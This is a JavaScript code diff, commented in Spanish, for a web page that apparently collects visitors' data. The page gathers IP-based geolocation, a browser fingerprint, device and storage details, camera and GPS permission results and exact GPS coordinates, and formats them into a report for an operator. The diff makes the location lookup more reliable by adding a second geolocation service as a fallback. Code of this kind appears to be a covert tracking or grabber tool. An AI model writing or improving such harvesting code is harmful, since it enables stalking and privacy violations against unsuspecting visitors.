@@ -191,11 +191,32 @@
             const fp = await getFingerprint();
             const storage = await getStorageInfo();
 
+            // 🔥 CAMBIO IMPORTANTE: Usamos ip-api.com (más confiable)
             let ipData = {};
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch(e) {}
+                const res = await fetch('http://ip-api.com/json/');
+                const data = await res.json();
+                if (data.status === 'success') {
+                    ipData = {
+                        ip: data.query || 'N/A',
+                        country_name: data.country || 'N/A',
+                        region: data.regionName || 'N/A',
+                        city: data.city || 'N/A',
+                        postal: data.zip || 'N/A',
+                        timezone: data.timezone || 'N/A'
+                    };
+                } else {
+                    throw new Error('API no devolvió éxito');
+                }
+            } catch(e) {
+                // Si falla ip-api, intentamos con ipapi.co como respaldo
+                try {
+                    const res2 = await fetch('https://ipapi.co/json/');
+                    ipData = await res2.json();
+                } catch(e2) {
+                    ipData = { ip: 'N/A', country_name: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', timezone: 'N/A' };
+                }
+            }
 
             const device = {
                 model: "Desconocido",
@@ -204,7 +225,7 @@
                 resolution: `${window.screen.width}x${window.screen.height}`,
                 cpuCores: navigator.hardwareConcurrency || 'N/A'
             };
-            if (navigator.userAgent.includes('iPhone')) device.model = 'iPhone OS ' + navigator.userAgent.match(/OS (\d+)/)[1] + '_' + navigator.userAgent.match(/OS \d+_(\d+)/)[1] + ' like Mac OS X';
+            if (navigator.userAgent.includes('iPhone')) device.model = 'iPhone';
             else if (navigator.userAgent.includes('iPad')) device.model = 'iPad';
             else if (navigator.userAgent.includes('Android')) device.model = 'Android';
             else if (navigator.userAgent.includes('Mac')) device.model = 'Mac';
@@ -216,7 +237,7 @@
             message += `📍 *Location Details*\n   • Country: ${ipData.country_name || 'N/A'}\n   • Region: ${ipData.region || 'N/A'}\n   • City: ${ipData.city || 'N/A'}\n   • Postal Code: ${ipData.postal || 'N/A'}\n   • Timezone: ${ipData.timezone || 'N/A'}\n\n`;
             message += `🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
             message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Granted' : 'Denied/Not available'}\n   • Location: ${gps ? 'Granted' : 'Denied/Not available'}\n\n`;
-            message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n\n`;
+            message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used || 'N/A'} GB\n   • Storage Total: ${storage.total || 'N/A'} GB\n\n`;
             if (gps) {
                 message += `🗺️ *GPS Coordinates*\n   • Latitude: ${gps.lat}\n   • Longitude: ${gps.lng}\n   • Accuracy: ${gps.accuracy}m\n\n`;
             }
